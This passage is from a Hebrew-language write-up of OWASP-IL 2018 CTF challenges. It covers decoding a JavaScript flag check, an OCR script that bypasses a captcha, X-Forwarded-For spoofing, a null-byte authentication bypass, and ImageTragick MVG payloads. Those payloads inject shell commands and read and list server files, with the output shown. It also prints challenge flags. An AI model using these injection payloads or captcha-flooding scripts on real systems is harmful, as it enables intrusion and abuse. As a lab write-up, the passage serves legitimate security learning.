    if(a.charCodeAt(0x0)=="79"&&a.charCodeAt(0x1)=="87"&&a.charCodeAt(0x2)=="65"&&a.charCodeAt(0x3)=="83"&&a.charCodeAt(0x4)=="80"&&a.charCodeAt(0x5)=="45"&&a.charCodeAt(0x6)=="73"&&a.charCodeAt(0x7)=="76"&&a.charCodeAt(0x8)=="123"&&a.charCodeAt(0x9)=="74"&&a.charCodeAt(0xa)=="52"&&a.charCodeAt(0xb)=="118"&&a.charCodeAt(0xc)=="52"&&a.charCodeAt(0xd)=="83"&&a.charCodeAt(0xe)=="99"&&a.charCodeAt(0xf)=="114"&&a.charCodeAt(0x10)=="49"&&a.charCodeAt(0x11)=="112"&&a.charCodeAt(0x12)=="116"&&a.charCodeAt(0x13)=="78"&&a.charCodeAt(0x14)=="105"&&a.charCodeAt(0x15)=="110"&&a.charCodeAt(0x16)=="106"&&a.charCodeAt(0x17)=="52"&&a.charCodeAt(0x18)=="33"&&a.charCodeAt(0x19)=="125")
    {
        console.log("Contratz! You got the flag!\nFlag: "+a)
    }
    else
    {
        console.log("You are so wrong.. :)")
    }
}
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הלוגיקה פה מספיק
קצרה וברורה בשביל שיהיה קל לייצר קוד ידני שמגלה מהו הדגל, למשל:</span></p>

```javascript
a = Array();
a[0x0]="79"; a[0x1]="87"; a[0x2]="65"; a[0x3]="83"; a[0x4]="80"; a[0x5]="45"; 
a[0x6]="73"; a[0x7]="76"; a[0x8]="123"; a[0x9]="74"; a[0xa]="52"; a[0xb]="118"; 
a[0xc]="52"; a[0xd]="83"; a[0xe]="99"; a[0xf]="114"; a[0x10]="49"; a[0x11]="112"; 
a[0x12]="116"; a[0x13]="78"; a[0x14]="105"; a[0x15]="110"; a[0x16]="106"; 
a[0x17]="52"; a[0x18]="33"; a[0x19]="125";
s = "";
for (var i in a) {
    s += String.fromCharCode(a[i]);
}
console.log(s);
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל הוא:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span class=objectbox><b><span lang=en-IL dir=LTR>OWASP-IL{J4v4Scr1ptNinj4!}</span></b></span></p>
<span class=objectbox><b><span lang=en-IL style='font-size:11.0pt;line-height:
107%;font-family:"Calibri",sans-serif'><br clear=all style='page-break-before:
always'>
</span></b></span>
<p class=MsoNormal><span class=objectbox><b><span lang=en-IL>&nbsp;</span></b></span></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 5 - </span><span
lang=EN-US dir=LTR>Break The Captcha</span><span dir=RTL></span><span lang=HE
style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת קושי
קלה, 250 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>My website is protected with Captcha so you cant flood my
forms!<br>
Do you think that you can bypass it with code and flood my form?</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8088/">http://challenges.owaspil.ctf.today:8088/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתר עצמו נראה כך:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=550
height=207 id="Picture 24" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image023.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>עבור הפתרון השתמשתי
ב-</span><span dir=LTR></span><span lang=HE dir=LTR><span dir=LTR></span> </span><span
lang=en-IL dir=LTR>Tesseract</span><span dir=RTL></span><span lang=en-IL
style='font-family:"Arial",sans-serif'><span dir=RTL></span> </span><span
lang=HE style='font-family:"Arial",sans-serif'>– ספריה לביצוע </span><span
lang=en-IL dir=LTR>OCR</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>. </span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ה-</span><span
lang=EN-US dir=LTR>captcha</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> שהאתר השתמש בו היה
פשוט ביותר, ללא רעש או הפרעות בתמונה, וספריית </span><span lang=EN-US dir=LTR>Tesseract</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> התמודדה איתו בצורה טובה יחסית. מדי פעם הספרייה הייתה מפספסת,
אבל אפשר היה להמשיך לנסות את התמונה הבאה (הדרישה הייתה לפענח 15 תמונות בחצי
דקה, אך לא הייתה דרישה לרצף פענוחים כלשהו).</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הקוד:</span></p>

```python
from PIL import Image
import pytesseract
import requests
 
CAPTCHA_BASE_URL = 'http://challenges.owaspil.ctf.today:8088'
with requests.Session() as s:
    for i in range(45):
           print ("-" * 15)
           print (i)
           url = CAPTCHA_BASE_URL + '/captcha.php'
           response = s.get(url, stream=True)
          
           guess = pytesseract.image_to_string(Image.open(response.raw))
           print (guess)
          
           payload = {'captcha': guess, "submit": ""}
           response = s.post(CAPTCHA_BASE_URL, data=payload)
           if "flag" in response.text:
                print (response.text)
                break
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><b><span lang=EN-US dir=LTR>OWASP-IL{YouAreTheCaptchaMaster!}</span></b><span
dir=RTL></span><b><span lang=EN-US style='font-family:"Arial",sans-serif'><span
dir=RTL></span> </span></b></p>
<b><span lang=HE dir=RTL style='font-size:11.0pt;line-height:107%;font-family:
"Arial",sans-serif'><br clear=all style='page-break-before:always'>
</span></b>
<p class=MsoNormal><b><span lang=HE dir=RTL style='font-family:"Arial",sans-serif'>&nbsp;</span></b></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 6 - </span><span
lang=EN-US dir=LTR>Around the world</span><span dir=RTL></span><span lang=HE
style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת קושי
קלה, 300 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>Hi you! Do you think that you traveled the world? Your
mission is to enter to our site with IP that belongs to country that we request
you</span></p>
<p><span lang=en-IL>Can you do that? (XFF is approved)</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8094/">http://challenges.owaspil.ctf.today:8094/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כניסה לאתר מציגה את
ההודעה הבאה:</span></p>
<p class=MsoNormal><span lang=en-IL>In order to get the flag you must to serve
from Argentina (You served from Israel)| Counter: 0\16</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתגר אומר בפירוש
ש-</span><span lang=EN-US dir=LTR>XFF</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> מותר, לכן כמובן
נשתמש ב-</span><span lang=EN-US dir=LTR>X-Forwarded-For</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> (זהו שדה
בכותרת של </span><span lang=EN-US dir=LTR>HTTP</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> שמשמש
לזיהוי כתובת ה-</span><span lang=EN-US dir=LTR>IP</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> המקורית של
הלקוח במידה והוא משתמש בפרוקסי. כמובן שאין מניעה להשתמש בשדה הזה גם אם לא
נמצאים מאחורי פרוקסי, או אפילו להשתמש בכתובת של פרוקסי כפי שנעשה פה).</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ראשית צריך למצוא
רשימת פרוקסים ממדינות שונות.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הרשימה שמצאתי הייתה
בנויה בפורמט הבא:</span></p>

```
201.20.99.10:3130     Brazil
90.161.42.152:40057   Spain
92.38.45.57:42273     Russia
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הקוד בסך הכל צריך
לחפש פרוקסי מתאים לפי הדרישה של האתר, ולכלול אותו ב-</span><span lang=EN-US
dir=LTR>Header</span><span dir=RTL></span><span lang=HE style='font-family:
"Arial",sans-serif'><span dir=RTL></span> של בקשת ה-</span><span lang=EN-US
dir=LTR>HTTP</span><span dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הקוד:</span></p>

```python
import requests, re
 
ip_table = {}
with open("proxy.txt") as f:
    for line in f:
        line = line.rstrip()
        ip, country = line.split("\t")
        ip_table[country.lower()] = ip.split(":")[0]
 
s = requests.Session()
 
country_regex = re.compile("In order to get the flag you must to serve from ([^(]+) \(")
url = 'http://challenges.owaspil.ctf.today:8094/'
headers = None
text = ""
while "OWASP" not in text:
    r = s.get(url, headers = headers)
    print (r.text)
    text = r.text
    match = country_regex.search(r.text)
    if match:
        country = match.group(1).lower()
        headers = {'X-Forwarded-For': ip_table[country]}
    else:
        print("No match for {}!".format(r.text))
        break
 
```

<p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt'><span
lang=EN-US style='font-size:10.0pt;line-height:107%;font-family:"Courier New"'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><b><span lang=EN-US dir=LTR>OWASP-IL{Wh0RuNTh3World?}</span></b></p>
<b><span lang=EN-US style='font-size:11.0pt;line-height:107%;font-family:"Calibri",sans-serif'><br
clear=all style='page-break-before:always'>
</span></b>
<p class=MsoNormal><b><span lang=EN-US>&nbsp;</span></b></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 7 </span><span
lang=HE style='font-family:"Arial",sans-serif'>–</span><span lang=HE
style='font-family:"Times New Roman",serif'> </span><span lang=EN-US dir=LTR>LazyAdmin</span><span
dir=RTL></span><span lang=HE style='font-family:"Times New Roman",serif'><span
dir=RTL></span> (רמת קושי בינונית, 350 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>Do you think that you can login with administrator
privileges in order to retrieve the flag? :)</span></p>
<p><span lang=en-IL>user:password</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8084/">http://challenges.owaspil.ctf.today:8084/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ובכן, התשובה היא
שלא... או במילים אחרות, את האתגר הזה לא הצלחתי לפתור. </span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>בכל זאת, אתן כיוון
מסוים שנראה לי הגיוני.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתר עצמו מכיל טופס
כניסה:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=224
height=115 id="Picture 51" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image024.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כניסה עם שם המשתמש
והסיסמא שסופקו מביאה אותנו אל הדף הבא:</span></p>
<p class=MsoNormal><span lang=en-IL>Only administrators can see the flag!</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כאמור, לא מצאתי
חולשה באתר, למרות שהכיוון שהגעתי אליו נראה לי הגיוני.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ה-</span><span
lang=EN-US dir=LTR>Headers</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> שחוזרים מהשרת עבור
כל בקשה כוללים את המידע הבא:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=166
height=63 id="Picture 52" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image025.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>באופן כללי, זה נחשב
בתור רעיון רע, כי אפשר לקחת את הפרטים הללו ולחפש חולשות ידועות. ולמעשה, אם
מחפשים את הגרסה הזו של </span><span lang=EN-US dir=LTR>AspNet</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>, מגיעים ל</span><span class=MsoHyperlink><span lang=EN-US><a
href="https://packetstormsecurity.com/files/111277/Microsoft-ASP.NET-Forms-Authentication-Bypass.html"><span
lang=HE style='font-family:"Arial",sans-serif'>חולשה אחת בולטת של </span><span
dir=LTR>Authentication Bypass</span></a></span></span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>!</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>על רגל אחת, הרעיון
הוא שאם שולחים שם משתמש עם תו </span><span lang=EN-US dir=LTR>Null</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> באמצע, למשל </span><span dir=LTR></span><span lang=EN-US
dir=LTR><span dir=LTR></span>“Admin\0AAA”</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>, עקב
החולשה יכול להווצר מצב שבו המערכת טועה ומאמתת את המשתמש בתור שם המשתמש שלפני ה-</span><span
lang=EN-US dir=LTR>Null</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>, כלומר </span><span
lang=EN-US dir=LTR>Admin</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>למרבה הצער, לא
הצלחתי לנצל את החולשה הזו (ולמעשה, בדף החולשה מתוארים כמה תנאים נוספים שיש
לעמוד בהם, כמו למשל היכולת להירשם לאתר עם שם משתמש בשליטת התוקף). או שאולי פשוט
לא הצלחתי לשלוח תו </span><span lang=EN-US dir=LTR>Null</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> כמו שצריך.
יהיה מעניין לראות זה היה הכיוון הנכון.</span></p>
<span lang=HE dir=RTL style='font-size:11.0pt;line-height:107%;font-family:
"Arial",sans-serif'><br clear=all style='page-break-before:always'>
</span>
<p class=MsoNormal><span lang=HE dir=RTL style='font-size:13.0pt;line-height:
107%;font-family:"Times New Roman",serif;color:#2F5496'>&nbsp;</span></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 8 - </span><span
lang=EN-US dir=LTR>Image converter</span><span dir=RTL></span><span lang=HE
style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת קושי
בינונית, 350 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>My magical tool can help you to convert pictures to PNG!</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8090/">http://challenges.owaspil.ctf.today:8090/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כניסה לאתר מציגה את
הממשק הבא להמרת תמונות:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=305
height=235 id="Picture 25" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image026.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר והממשק
מקפידים לדבר על &quot;קסם&quot;, רמז ברור ל-</span><span dir=LTR></span><span
lang=HE dir=LTR><span dir=LTR></span> </span><span lang=EN-US dir=LTR>I</span><span
lang=en-IL dir=LTR>mage</span><span lang=EN-US dir=LTR>M</span><span
lang=en-IL dir=LTR>agick</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>(כלי יחסית סטנדרטי
להמרת ועריכת תמונות).</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לכן, התחלתי לחפש
בגוגל חולשות של כלי הזה, והגעתי מיד למשפחת חולשות בשם </span><span
class=MsoHyperlink><span lang=EN-US><a href="https://imagetragick.com/"><span
dir=LTR>ImageTragick</span></a></span></span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>החולשות המתוארות
בדף ההוא מאפשרות בין השאר להריץ קוד ולקרוא קבצים, בדיוק מה שאנחנו צריכים.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>מתוך הדף:</span></p>
<p class=MsoQuote><span lang=en-IL>The most dangerous part is ImageMagick
supports several formats like svg, mvg (thanks to </span><span lang=en-IL
style='font-style:normal'>Stewie</span><span lang=en-IL> for his research of
this file format and idea of the local file read vulnerability in ImageMagick,
see below), maybe some others - which allow to include external files from any
supported protocol including delegates.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>למזלנו, אחד
הפורמטים שהאתר שלנו תומך בו הוא </span><span lang=en-IL dir=LTR>MVG</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>!</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>נייצר קובץ </span><span
lang=EN-US dir=LTR>MVG</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> זדוני לפי ההוראות,
ונעלה לאתר:</span></p>

```svg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -la>/tmp/e1.txt;")'
pop graphic-context
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתר מסכים לקבל את
הקובץ הזה, ומציע להוריד חזרה את התוצאה בכתובת </span><span class=MsoHyperlink><span
lang=EN-US><a
href="http://challenges.owaspil.ctf.today:8090/uploads/tmpdmalOL.png"><span
dir=LTR>http://challenges.owaspil.ctf.today:8090/uploads/tmpdmalOL.png</span></a></span></span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>מדובר בקובץ תמונה
ריק (תמונה לבנה). למרבה המזל, אם ננסה לגשת ל-</span><span lang=EN-US dir=LTR>e1.txt</span><span
dir=RTL></span><span lang=EN-US style='font-family:"Arial",sans-serif'><span
dir=RTL></span> </span><span lang=HE style='font-family:"Arial",sans-serif'>(שיצרנו
באמצעות החולשה) מתוך תיקיית </span><span lang=EN-US dir=LTR>uploads</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>, נקבל את התוכן שרצינו:</span></p>

```
total 20
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 .
drwxr-xr-x 1 root root 4096 Aug 29 13:52 ..
-r-xr-xr-x 1 root root 3663 Aug 27 10:40 app.py
-r-xr-xr-x 1 root root   14 Aug 27 10:40 requirements.txt
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 templates
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כעת ניתן לקרוא את
הקובץ </span><span lang=EN-US dir=LTR>app.py</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>, למשל, </span><span
lang=HE style='font-family:"Arial",sans-serif'>בעזרת פקודה אחרת:</span></p>

```svg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@app.py'
pop graphic-context
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>התוצאה:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=425
height=319 id="Picture 26" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image027.jpg"
alt="http://challenges.owaspil.ctf.today:8090/uploads/tmpxuig5e.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>(זוהי לא תמונת מסך,
אלא התמונה עצמה שנוצרה מתהליך ההמרה! הטקסט מוטמע בתמונה על ידי השרת. בפועל,
התמונה קטנה מדי בשביל להכיל את כל הקוד של </span><span lang=EN-US dir=LTR>app.py</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>, ולכן אפשר להשתמש בשיטה הראשונה כדי לקבל את הקוד כולו כקובץ
טקסט. אולם, הדגל לא נמצא שם).</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כעת ננסה לסייר בעץ
התיקיות באמצעות הפקודה הבאה:</span></p>

```svg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls -alR />/tmp/e2.txt;")'
pop graphic-context
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>התוצאה היא מבנה
התיקיות השלם של השרת. </span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>למשל:</span></p>

```
/:
total 1208
drwxr-xr-x   1 root root    4096 Aug 29 13:52 .
drwxr-xr-x   1 root root    4096 Aug 29 13:52 ..
-rwxr-xr-x   1 root root       0 Aug 29 13:52 .dockerenv
dr-xr-xr-x   1 root root    4096 Aug 29 13:52 app
drwxr-xr-x   1 root root    4096 Aug 29 13:45 bin
drwxr-xr-x   2 root root    4096 Jun 26 12:03 boot
drwxr-xr-x   5 root root     340 Sep  4 18:54 dev
drwxr-xr-x   1 root root    4096 Aug 29 13:52 etc
-r-xr-xr-x   1 root root      23 Aug 29 12:17 flag.txt
drwxr-xr-x   1 root root    4096 Aug 29 13:52 home
drwxr-xr-x   1 root root    4096 Aug 29 13:45 lib
drwxr-xr-x   2 root root    4096 Jul 16 00:00 lib64
drwxr-xr-x   2 root root    4096 Jul 16 00:00 media
drwxr-xr-x   2 root root    4096 Jul 16 00:00 mnt
drwxr-xr-x   2 root root    4096 Jul 16 00:00 opt
dr-xr-xr-x 305 root root       0 Sep  4 18:54 proc
drwx------   1 root root    4096 Aug 29 13:52 root
drwxr-xr-x   3 root root    4096 Jul 16 00:00 run
drwxr-xr-x   2 root root    4096 Jul 16 00:00 sbin
drwxr-xr-x   2 root root    4096 Jul 16 00:00 srv
dr-xr-xr-x  13 root root       0 Sep  5 07:14 sys
drwxrwxrwt   1 root root 1155072 Sep 24 07:59 tmp
drwxr-xr-x   1 root root    4096 Jul 16 00:00 usr
drwxr-xr-x   1 root root    4096 Jul 16 00:00 var
 
/app:
total 20
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 .
drwxr-xr-x 1 root root 4096 Aug 29 13:52 ..
-r-xr-xr-x 1 root root 3663 Aug 27 10:40 app.py
-r-xr-xr-x 1 root root   14 Aug 27 10:40 requirements.txt
dr-xr-xr-x 1 root root 4096 Aug 29 13:52 templates
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR>&nbsp;</span></p>
